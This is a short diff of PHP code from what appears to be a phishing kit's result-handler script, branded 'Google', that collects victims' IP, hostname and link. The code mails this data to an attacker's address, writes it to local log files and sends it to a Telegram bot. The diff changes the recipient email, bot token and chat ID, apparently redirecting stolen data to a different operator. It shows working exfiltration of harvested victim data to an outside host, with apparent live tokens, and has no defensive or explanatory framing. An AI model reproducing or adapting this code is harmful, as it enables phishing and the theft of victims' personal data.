@@ -10,7 +10,7 @@ $message .= "IPs              : $ip\n";
 $message .= "HN               : $hostname\n";
 $message .= " U7l             : $link\n";
 $message .= "---------------\n";
-$send = "machinoumohamed@yandex.com";
+$send = "@yandex.com";
 $subject = "Google| $ip ";
 $headers = "From:Trnswise <don@mox.fr>";
 mail($send,$subject,$message,$headers);
@@ -18,9 +18,9 @@ mail($send,$subject,$message,$headers);
 fwrite($Txt_Rezlt, $message);
 fclose($Txt_Rezlt);
 
-$token = "1471281489:AAEbxSXQjFX1LdEi7zJ66aZxCOVHbS7EDbg";
+$token = "5380008377:AAEOB2vvo-T363FsB0gpbCOPoNP6mrbaTDM";
 
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1497188295&text=" . urlencode($message)."" );
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1289904248&text=" . urlencode($message)."" );
 $file = fopen("tiim.txt","a");   ///  Directory Of Rezult OK.
 fwrite($file,$message); 
 
